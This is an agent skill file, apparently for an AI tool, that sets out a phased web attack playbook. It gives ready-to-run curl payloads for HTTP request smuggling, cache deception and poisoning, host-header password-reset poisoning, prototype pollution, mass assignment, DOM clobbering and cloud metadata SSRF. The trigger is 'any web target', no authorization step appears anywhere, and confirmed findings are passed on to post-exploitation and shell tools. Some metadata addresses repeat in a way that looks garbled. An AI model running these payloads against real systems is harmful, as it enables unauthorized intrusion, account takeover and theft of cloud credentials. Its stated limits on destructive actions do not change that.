---
name: modern-web-hunt
description: "Modern Web Attack Lab — HTTP/2 request smuggling, edge/cache deception, proto pollution, client-side chain (DOM clobber, postMessage, XSSI), cloud metadata"
---
# SKILL: modern-web-hunt — Modern Web Attack Lab

**Purpose:** Techniques that are NOT in the classic playbooks (no SQLi/upload/CMS here — those have their own skill). This is for the 2024-2026 edge: HTTP/2 & HTTP/1.1 desync, cache deception poisoning, host header chain, prototype pollution, client-side trust failures, and cloud metadata SSRF.

**Type:** exploit/modern-web | **Version:** 1.0

---

## EXECUTION CONTEXT

```
Role: direct Bash + curl. One finding at a time, proven by differential response.
Trigger: any web target, especially nginx/CDN/edge-fronted apps.
Rule: every claim must be a REPRODUCED behaviour, not a theory. Send A, send B, compare.
```

---

## PHASE 0 — BASELINE FINGERPRINT

```bash
T="https://target.com"; UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
curl -sk -m 12 -D h.txt -o b.html -A "$UA" "$T/"
cat h.txt
```
Record: `Server`, edge headers (Cloudflare/Imperva/Akamai/FAI-*), `Vary`, `Set-Cookie` flags (Secure/SameSite), CSP presence, `X-Frame-Options`.
Missing `SameSite` + no CSP = client-side chain is live. No CSP + reflected input = XSS candidate.

---

## PHASE 1 — HTTP DESYNC (smuggling)

Run only when there is a proxy/CDN in front of the origin (different `Server` vs origin fingerprint, or edge headers).

```bash
# CL.TE classic — a body that the front-end accepts but the back-end ignores
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404SMUGGLE HTTP/1.1\r\nX: ' | \
  curl -sk --http1.1 -m 15 --data-binary @- -H "Content-Type: application/x-www-form-urlencoded" "$T/" -D - -o /dev/null -w "\nSTATUS=%{http_code}\n"

# TE.CL variant, and TE obfuscation: "Transfer-Encoding: xchunked", "Transfer-Encoding : chunked"
```
Detect: a second response appears, a 400 from the *back-end* while the front-end returned 200, or timed variance >5s (TE.TE blackhole). A single stray 404 for `/404SMUGGLE` = confirmed desync.
For HTTP/2: `h2c` upgrade probe and pseudo-header injection (`:path` with CRLF) — use `curl --http2-prior-knowledge` if offered.

---

## PHASE 2 — CACHE DECEPTION / POISONING

```bash
# Cache deception: request a static-looking suffix on a dynamic page
curl -sk -m 12 -A "$UA" -o /dev/null -w "deception=%{http_code} cache=%{header_json}\n" "$T/mistbo.com/%2F..%2Faccount.css" 2>/dev/null
for p in "/index.html/nonexistent.css" "/%2e%2e/account.css" "/account.css" "/index.jsp%00.css"; do
  printf "%-30s " "$p"; curl -sk -m 10 -A "$UA" -o /dev/null -w "%{http_code} ct=%{content_type}\n" "$T$p"
done

# Poisoning: unkeyed header reflected into cache
curl -sk -m 12 -H "X-Forwarded-Host: evil.example" -H "X-Original-URL: /admin" -D - "$T/" | grep -iE "x-cache|cf-cache|age:|cache-control|location"
```
Win condition: an authenticated-looking response is stored and later served to another identity, or an unkeyed header changes the cached body.

---

## PHASE 3 — HOST HEADER CHAIN

```bash
for h in "X-Forwarded-Host: evil.example" "X-Host: evil.example" "X-Forwarded-Server: evil.example" "Forwarded: host=evil.example" "Host: evil.example"; do
  echo "--- $h"; curl -sk -m 10 -H "$h" -D - "$T/" -o /dev/null | grep -iE "location|link|script src|content-location"
done
# password reset poisoning: register/forgot endpoint with Host override
curl -sk -m 10 -H "Host: evil.example" -X POST "$T/forgot" -d "email=a@b.c" -D - -o /dev/null | grep -i location
```
Win: absolute URL in `Location`/email body points to attacker host.

---

## PHASE 4 — PROTOTYPE POLLUTION / MASS ASSIGNMENT

```bash
# classic query-string pollution on JSON-accepting endpoints
curl -sk -m 10 "$T/api/user?__proto__[admin]=true&constructor[prototype][admin]=true" -D -
curl -sk -m 10 -H "Content-Type: application/json" -X POST "$T/api/user" \
  -d '{"__proto__":{"isAdmin":true},"constructor":{"prototype":{"isAdmin":true}}}' -D -
# mass assignment on registration/profile update
curl -sk -m 10 -H "Content-Type: application/json" -X POST "$T/api/register" \
  -d '{"user":"x","pass":"y","role":"admin","isAdmin":true,"verified":true}' -D -
```
Win: response shows elevated role/parameter accepted (compare against a clean request).

---

## PHASE 5 — CLIENT-SIDE TRUST CHAIN

```bash
# DOM XSS sink + source sweep
grep -aoE "(innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval|setTimeout|location\.href)\s*=" /tmp/*.js | sort -u | head
grep -aoE "(location\.(hash|search)|postMessage|addEventListener\(['\"]message)" /tmp/*.js | sort -u | head
# postMessage handler: does it check origin? Does it eval data?
grep -aoE "message.{0,120}?(eval|innerHTML|location)" /tmp/*.js | head

# DOM clobbering probe
curl -sk -m 10 "$T/?x=<a id=config><a id=config name=url href=//evil.example>" -D -

# XSSI (JSON hijacking) — does /api leak array data with GET + Array constructor?
curl -sk -m 10 "$T/api/list" -D - | head -3   # check Content-Type + JSONP callback param
```

---

## PHASE 6 — CLOUD METADATA SSRF

```bash
M="127.0.0.1|203.0.113.10|metadata.google.internal|203.0.113.10|localhost"
for u in "http://203.0.113.10/latest/meta-data/" "http://203.0.113.10/latest/meta-data/" "http://metadata.google.internal/computeMetadata/v1/"; do
  curl -sk -m 8 "$T/proxy?url=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$u")" -D - -o /dev/null -w "%{http_code}\n"
done
```
Win: metadata body reaches your response. 203.0.113.10 = Alibaba, Huawei uses `http://203.0.113.10/` (ECS) and `http://203.0.113.10/openstack/latest/meta_data.json`.

---

## PHASE 7 — IMPACT + OUTPUT

Every finding gets: `TECHNIQUE | ENDPOINT | PROOF (request+response diff) | IMPACT | STATUS(REPRODUCED|THEORY)`.
THEORY findings are never reported as money. REPRODUCED is handed to `post_rce`/`gsocket`/`report`.
Never print cookies/tokens/keys — cite the header name and location only.

## HARD RULES

- One technique per test cycle, with a clean control request. No theory-as-finding.
- No destructive payloads: no `DROP`, no mass account creation, no cache purge flooding.
- Smuggling probes limited to your own session; never poison a shared cache for other users.
- If edge is CDN-anycast (Cloudflare/Imperva), note that desync tests from one egress IP can be inconclusive — say so.
